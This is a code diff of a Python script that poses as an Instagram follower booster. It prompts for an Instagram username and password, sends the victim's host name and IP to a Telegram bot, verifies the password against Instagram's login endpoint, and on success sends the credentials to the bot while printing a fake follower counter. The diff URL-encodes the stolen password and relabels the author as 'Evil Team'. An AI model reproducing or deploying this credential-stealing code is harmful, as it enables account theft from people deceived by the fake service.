@@ -2,6 +2,7 @@ import socket
 import os
 import time
 import requests
+import urllib.parse
 #os.system("xdg-open ")
 os.system('clear')
 
@@ -23,7 +24,7 @@ __________________________________
 \033[1;37m|_________________________________\033[1;37m|
 
 ----------------------------------
-\033[1;37m|      Created By \033[1;91m: Maker \033[1;37mTeam       |
+\033[1;37m|      Created By \033[1;91mEvil \033[1;37mTeam      |
 ----------------------------------
 
 """)
@@ -35,10 +36,11 @@ y = '\033[0;93m'
 #the first input
 acc = input ('\033[1;91m{+} \033[1;92mEnter your instgram account: ')
 pac = input ('\033[1;91m{+} \033[1;92mEnter your account password: ')
+encoded_text = urllib.parse.quote(pac)
 #get _____ip____
 hostname = socket.gethostname()
 ipaddr = socket.gethostbyname(hostname)
-telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=targetip\ntargethost:{hostname}\nipadress:{ipaddr}')
+telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target ip\ntarget host : {hostname}\nip adress : {ipaddr}')
 req = requests.post(telegram_sand)
 #the header's
 url_l = 'https://www.instagram.com/accounts/login/ajax/'
@@ -64,7 +66,7 @@ d = {'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1643714074:' + (pac), 'username':
 r = requests.post(url_l,headers=h,data=d)
 #the telegram sender
 if '"authenticated":true' in r.text:
-    telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\npassword : {pac}\nusername : {acc}')
+    telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\npassword : {encoded_text} \nusername : {acc}')
     req = requests.post(telegram_sand)
     print ('\033[1;95m|- Checking your email..! ')
     time.sleep(3)
@@ -73,7 +75,7 @@ if '"authenticated":true' in r.text:
     print ('\033[1;94m|-Note: Now i will send 1500 follower to you please dont close the terminal')
     time.sleep(3)
     print ('\033[1;95m|-Note: \033[1;93mThis process can take a lot of time so dont close the wifi')
-    while followers < 15001:
+    while followers < 350:
         followers = followers +1
         time.sleep(0.50)
         print ('\033[1;95m{=} \033[0;92mfollowers sended: ', y, followers)
